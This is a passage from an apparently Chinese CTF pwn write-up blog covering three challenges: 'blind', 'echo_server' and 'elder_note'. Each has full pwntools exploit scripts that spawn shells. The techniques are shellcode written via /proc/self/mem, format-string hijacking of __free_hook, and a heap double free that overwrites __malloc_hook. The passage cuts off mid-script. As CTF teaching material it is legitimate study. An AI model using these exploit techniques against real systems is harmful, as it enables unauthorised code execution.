title="blind"></a>blind</h3><p>ä¸€é“ç›²æ‰“é¢˜ï¼Œé¦–å…ˆå‘Šè¯‰äº†æˆ‘ä»¬ write çš„ libc åœ°å€ï¼Œæˆ‘ä»¬ä¾¿èƒ½åˆ©ç”¨<code>LibcSearcher</code>è·å– libcã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/220601/13/24783/19717/63c7ae06F70f2d582/3bd0aaa0971b77d5.png" style="zoom:80%;" /><p>ç„¶åç¨‹åºå‘Šè¯‰æˆ‘ä»¬å¯ä»¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬äº†è§£ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼šLinux å†…æ ¸æä¾›äº†ä¸€ç§é€šè¿‡ <strong>/proc</strong> æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨è¿è¡Œæ—¶è®¿é—®å†…æ ¸å†…éƒ¨æ•°æ®ç»“æ„ã€æ”¹å˜å†…æ ¸è®¾ç½®çš„æœºåˆ¶ã€‚proc æ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ª<strong>ä¼ªæ–‡ä»¶</strong>ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚è¯»å– <strong>/proc/self/maps</strong> å¯ä»¥å¾—åˆ°å½“å‰è¿›ç¨‹çš„<strong>å†…å­˜æ˜ å°„å…³ç³»</strong>ï¼Œé€šè¿‡è¯»è¯¥æ–‡ä»¶çš„å†…å®¹å¯ä»¥<strong>å¾—åˆ°å†…å­˜ä»£ç æ®µåŸºå€</strong>ã€‚<span style='color:red;font-weight:550'>/proc/self/mem</span> æ˜¯è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œ<strong>é€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜</strong>ã€‚è¯¥æ–‡ä»¶ä¸èƒ½ç›´æ¥è¯»å–ï¼Œéœ€è¦ç»“åˆ maps çš„æ˜ å°„ä¿¡æ¯æ¥ç¡®å®šè¯»çš„åç§»å€¼ã€‚å³æ— æ³•è¯»å–æœªè¢«æ˜ å°„çš„åŒºåŸŸï¼Œåªæœ‰è¯»å–çš„åç§»å€¼æ˜¯è¢«æ˜ å°„çš„åŒºåŸŸæ‰èƒ½æ­£ç¡®è¯»å–å†…å­˜å†…å®¹ã€‚</p><p>ç¨‹åºç»™äº†æˆ‘ä»¬<code>libcåŸºå€</code>ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€æ‰“å¼€<code>/proc/self/mem</code>æ–‡ä»¶ï¼Œæ‰“å¼€åï¼Œç¨‹åºè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåœ°å€è¿›è¡Œç¯¡æ”¹ï¼Œå› ä¸º main å‡½æ•° ret æ—¶è¿”å›çš„æ˜¯<code>__libc_start_main</code>ï¼Œå› æ­¤æˆ‘ä»¬ç¯¡æ”¹è¯¥å†…å­˜å³å¯ï¼ˆ<strong>ç›´æ¥å†™å†…å­˜ç»•å¼€äº† libc æ–‡ä»¶ä¸å¯å†™çš„é˜²æŠ¤</strong>ï¼‰ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/7080/30/21758/7849/63c7ae0bF0edbfbdf/eb5364df131c83a0.png" style="zoom:80%;" /><p>ä½†å› ä¸º main å‡½æ•° <strong>ret çš„æ˜¯ libc_start_main+???</strong> è€Œä¸æ˜¯ libc_start_main+0ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¶³å¤Ÿå¤šçš„ nop æ¥è¦†ç›–åˆ° libc_start_main+???ï¼Œä»¤å…¶æ»‘å€’åœ¨ shellcode ä¸Šã€‚</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">51916</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line">brute()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;: 0x&#x27;</span>)</span><br><span class="line">write=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base=write-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base===&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__libc_start_main=libc_base+libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;/proc/self/mem\x00&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(__libc_start_main))</span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh()).rjust(<span class="number">0x300</span>,asm(<span class="string">&#x27;nop&#x27;</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="echo-server"><a href="#echo-server" class="headerlink" title="echo_server"></a>echo_server</h3><p>åœ¨å †ä¸Šæ„é€ æ ˆçš„ fmt é“¾å­çš„é¢˜ç›®ï¼Œæ€»ç®—æœ‰æœºä¼šå¤ç›˜ä¸€éäº†ï¼Œç¡®å®éº»çƒ¦ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/38973/13/22033/28494/63c7aeacFa044f73d/7945680aac3fdbbe.png" style="zoom:80%;" /><p>ç¨‹åºé€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªä¸æ–­å¾ªç¯çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬åŠ¨è°ƒçœ‹ä¸€ä¸‹æ ˆçš„ç»“æ„ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/184800/16/30987/103139/63c7aeacF807096d0/dac72b77454e61c7.png" style="zoom:80%;" /><p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡º<code>rbp</code>å’Œ<code>libc</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%6$p-%13$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(rbp)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br></pre></td></tr></table></figure><p>å› ä¸º realloc çš„<code>size</code>ä½ä¸º 0 æ—¶ç­‰åŒäº freeï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬é€‰æ‹©åœ¨æ ˆä¸Šæ„é€  __free_hookã€‚</p><p>å¦‚ä½•æ„é€ å°±éœ€è¦ç”¨åˆ° rbp é“¾äº†ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/8746/26/21445/113047/63c7aeadF796627ad/e564dde984db2034.png" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main_in_stack=(rbp &amp; <span class="number">0xFF</span>)+<span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_in_stack:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_in_stack))</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack+<span class="number">2</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬é€‰æ‹©å…ˆæ„é€ ä¸­é—´ä¿©å­—èŠ‚ï¼Œæ‰€ä»¥å°† rbp ä¿®æ”¹ä¸º<code>ç›®æ ‡åœ°å€+2</code>å¤„</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32370/12/20382/52439/63c7aeafF1f410f93/36d22f9cd324267d.png" style="zoom:80%;" /><p>ç„¶åæˆ‘ä»¬åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå°† rbp æŒ‡å‘å¤„å†™å…¥ __free_hook å¯¹åº”çš„ 2 ä¸ªå­—èŠ‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>((__free_hook &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/181181/27/31734/49453/63c7aeaeF8db3bcc9/9774a07007e1c680.png" style="zoom:80%;" /><p>é‡å¤ä¸Šè¿°æ­¥éª¤æˆ‘ä»¬åŒç†å¯ä»¥ä¿®æ”¹æœ€åä¸¤ä¸ªå­—èŠ‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/63189/30/23701/56144/63c7af8cFe4ad12d6/d1e9b4b51c1f0698.png" style="zoom:80%;" /><p>è¿™æ ·æˆ‘ä»¬åœ¨æ ˆä¸Šå°±æœ‰äº†<code>__free_hook</code>ï¼Œé‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œé€šè¿‡åˆ©ç”¨å½“å‰ rbp ä¿®æ”¹å†™å…¥ä½ç½®ï¼Œæˆ‘ä»¬ä¾¿èƒ½å°†<code>__free_hook</code>åŠ«æŒä¸º<code>system</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">2</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">4</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+4=&gt;(system &gt;&gt; 32) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/63189/30/23701/56144/63c7af8cFe4ad12d6/d1e9b4b51c1f0698.png" style="zoom:80%;" /><p>å®Œæ•´ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="comment">#get libc &amp; rbp</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%6$p-%13$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(rbp)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">__libc_start_main_in_stack=(rbp &amp; <span class="number">0xFF</span>)+<span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_in_stack:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_in_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp1=&gt;rbp2</span></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main+2</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack+<span class="number">2</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main+2</span></span><br><span class="line"><span class="comment">#__libc_start_main+2=(__free_hook &gt;&gt; 16) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>((__free_hook &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp1=&gt;rbp2</span></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main</span></span><br><span class="line"><span class="comment">#__libc_start_main+0=__free_hook &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"><span class="comment">#now original __libc_start_main_in_stack = __free_hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#__free_hook+0=&gt;(system) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__free_hook</span></span><br><span class="line"><span class="comment">#__free_hook=__free_hook+2</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">2</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+2=&gt;(system &gt;&gt; 16) &amp; 0xFFFF</span></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__free_hook+2</span></span><br><span class="line"><span class="comment">#__free_hook+2=__free_hook+4</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">4</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+4=&gt;(system &gt;&gt; 32) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"><span class="comment">#now free_hook =&gt; system</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="elder-note"><a href="#elder-note" class="headerlink" title="elder_note"></a>elder_note</h3><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/129636/40/34283/6010/63c7b2c5F9c8406a8/c2b2fed3e7319002.png" style="zoom:80%;" /><p>libc2.23 ä¸‹çš„ <strong>UAF</strong>ï¼Œæœ€å¤§å¯ç”³è¯· 0x100 å¤§å°çš„ chunkï¼Œæ‰€ä»¥é€šè¿‡ unsorted bin leak ä¾¿èƒ½æ³„éœ²å‡º libcã€‚é€šè¿‡ double free å°† chunk åˆ†é…åˆ°<code>&amp;_malloc_hook-0x23</code>å¤„ã€‚ä½†å› ä¸ºæ— æ³•æ»¡è¶³ one_gadget çš„æ¡ä»¶ï¼Œæ‰€ä»¥é…åˆ<code>&amp;_realloc_hook</code> è°ƒæ•´æ ˆå¸§ï¼Œå³å°†<code>&amp;_malloc_hook</code>åŠ«æŒä¸º<code>&amp;realloc+?</code>ï¼Œå†å°†<code>&amp;_realloc_hook</code>åŠ«æŒä¸º one_gadgetã€‚</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">0x100</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x1</span>, <span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x2</span>, <span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x68</span> </span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">__realloc_hook = libc_base + libc.sym[<span class="string">&quot;__realloc_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xb</span> + p64(one_gadget) + p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span 